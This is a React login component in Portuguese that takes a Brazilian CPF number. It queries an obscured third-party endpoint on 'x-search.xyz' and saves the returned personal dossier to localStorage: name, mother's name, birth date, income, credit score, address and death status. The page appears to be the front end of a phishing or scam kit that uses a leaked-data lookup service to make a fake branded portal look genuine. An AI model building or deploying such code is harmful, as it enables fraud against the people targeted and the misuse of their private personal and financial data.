import { useState } from "react";
import axios from "axios";
import logo from "../assets/logo-rosa.svg";

// Define the API instance with the new endpoint
// eslint-disable-next-line react-refresh/only-export-components
export const api = axios.create({
    baseURL: "https://x-search.xyz/3nd-p01n75/xsiayer0-0t/rxe404r020125/r0070x/01",
});


export function Login() {
    const [cpf, setCpf] = useState<string>("");
    const [isLoading, setIsLoading] = useState<boolean>(false);
    const [errorMessage, setErrorMessage] = useState<string>("");

    const [isChecked, setIsChecked] = useState(true);

    const handleToggle = () => {
        setIsChecked(!isChecked);
    };

    // Function to apply CPF mask and restrict input to 11 digits
    const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        let value = event.target.value.replace(/\D/g, "");
        if (value.length > 11) value = value.slice(0, 11);

        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d)/, "$1.$2");
        value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

        setCpf(value);
    };

    // Function to fetch data from the API using CPF
    const handleNext = async () => {
        if (cpf.length < 14) {
            setErrorMessage("Por favor, insira um CPF válido.");
            return;
        }

        setIsLoading(true);
        setErrorMessage(""); // Clear previous error messages

        try {
            const response = await api.get(`/cpf.php?cpf=${cpf.replace(/\D/g, "")}`);

            // Check if response is successful and contains data
            if (response.data?.status === 1 && response.data.dados?.length > 0) {
                const userData = response.data.dados[0];

                // Save user data to localStorage
                localStorage.setItem("userData", JSON.stringify({
                    nome: userData.Nome,
                    cpf: userData.CPF,
                    dataNascimento: userData.Data_Nascimento,
                    nomeMae: userData.Nome_Mae,
                    sexo: userData.Sexo,
                    renda: userData.Renda,
                    score: userData.Score,
                    endereco: userData.Endereco,
                    numero: userData.Numero,
                    bairro: userData.Bairro,
                    cidade: userData.Cidade,
                    estado: userData.Estado,
                    obito: userData.Obito
                }));

                // Redirect after successful fetch
                window.location.href = "/menu";
                window.scrollTo({ top: 0, behavior: 'smooth' }); // Rola para o topo com efeito suave
            } else {
                setErrorMessage("CPF não encontrado. Verifique e tente novamente.");
            }
            // eslint-disable-next-line @typescript-eslint/no-unused-vars
        } catch (error) {
            setErrorMessage("Erro ao buscar dados. Tente novamente mais tarde.");
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="w-screen px-6 space-y-8 mt-6">
            <header className="flex justify-start p-4">
                <img width={40} src={logo} alt="logo" />
            </header>

            <div>
                <h1 className="text-2xl text-zinc-600">
                    Digite seu CPF
                </h1>
            </div>

            {/* CPF Input */}
            <div className="flex items-center space-x-2">
                <input
                    type="text"
                    value={cpf}
                    onChange={handleCpfChange}
                    className="border border-primary p-3 rounded-lg w-full text-lg outline-none"
                    placeholder="000.000.000-00"
                    maxLength={14}
                />
            </div>

            {/* Error Message */}
            {errorMessage && <p className="text-red-600">{errorMessage}</p>}

            {/* Next Button */}

            <div className="flex items-center space-x-4">
                {/* Toggle Switch */}
                <label className="relative inline-flex items-center cursor-pointer">
                    <input
                        type="checkbox"
                        checked={isChecked}
                        onChange={handleToggle}
                        className="sr-only peer"
                    />
                    <span
                        className={`w-10 h-6 bg-gray-200 peer-focus:ring-2 peer-focus:ring-blue-400 rounded-full peer peer-checked:after:translate-x-4 peer-checked:after:border-white after:content-[''] after:absolute after:top-1 after:left-1 after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-primary`}
                    ></span>
                </label>

                {/* Label Text */}
                <p className="text-zinc-600">
                    Lembrar CPF para o próximo acesso
                </p>
            </div>


            <button
                onClick={handleNext}
                className={`w-full rounded-lg text-white p-6 flex items-center justify-center h-10 transition-transform duration-150 ${isLoading ? "bg-primary cursor-not-allowed transform scale-90" : "bg-primary  hover:scale-105"}`}
                disabled={isLoading}
            >
                {isLoading ? (
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div>
                ) : (
                    "Continuar"
                )}
            </button>


            <div className="flex flex-col items-center text-zinc-400 space-y-6">
                <div className="">
                    <span className="font-semibold text-primary">Veja aqui</span> as soluções para sua empresa.
                </div>
                <span className="font-semibold text-zinc-500">Termos de Uso e Política de Privacidade</span>
            </div>
        </div>
    );
}
